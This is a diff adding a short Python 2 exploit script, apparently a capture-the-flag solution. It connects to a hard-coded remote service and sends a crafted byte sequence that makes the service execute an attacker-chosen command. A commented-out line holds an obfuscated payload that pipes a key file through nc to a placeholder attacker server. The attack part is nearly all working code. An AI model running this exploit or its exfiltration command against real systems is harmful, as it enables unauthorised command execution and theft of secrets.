@@ -1,0 +1,44 @@
+#!/usr/bin/env python
+from socket import create_connection
+from time import sleep
+
+
+def func(s):
+    buf = 0
+    for c in s[::-1]:
+        buf = (37 * (buf + ord(c))) % 2**32
+    v2 = buf % 17 + 1
+    v3 = (buf & 0xF) + 1
+    v1 = 43 - v2 - v3
+    return v1, v2, v3
+
+
+if __name__ == "__main__":
+    #command = "IFS=_;a=cat_key;b=nc_YOURSERVERIP_PORT;${a}|${b}"
+    command="ls"
+    res = func(command)
+    print res
+
+    con = create_connection(('58.229.183.18', 8181))
+    print con.recv(1024)
+    print con.recv(1024)
+    con.send(command)
+    sleep(0.1)
+
+    a, b, c = res
+    cc = c / 2
+    print con.recv(1024)
+    if c % 2 == 0:
+        con.send("\x01"*(a-cc) + "\x02"*(b-cc) + "\x03" + "\x01\x02\x03\x03"*(cc-1) + "\x01\x02\x03" + "\n")
+    else:
+        con.send("\x01"*(a-cc) + "\x02"*(b-cc) + "\x03" + "\x01\x02\x03\x03"*(cc) + "\n")
+    sleep(0.1)
+
+
+    print con.recv(1024)
+    while(1):
+        sleep(1)
+        ans = con.recv(1024)
+        print ans
+        if ans.find("[!]") != -1:
+            exit(0)
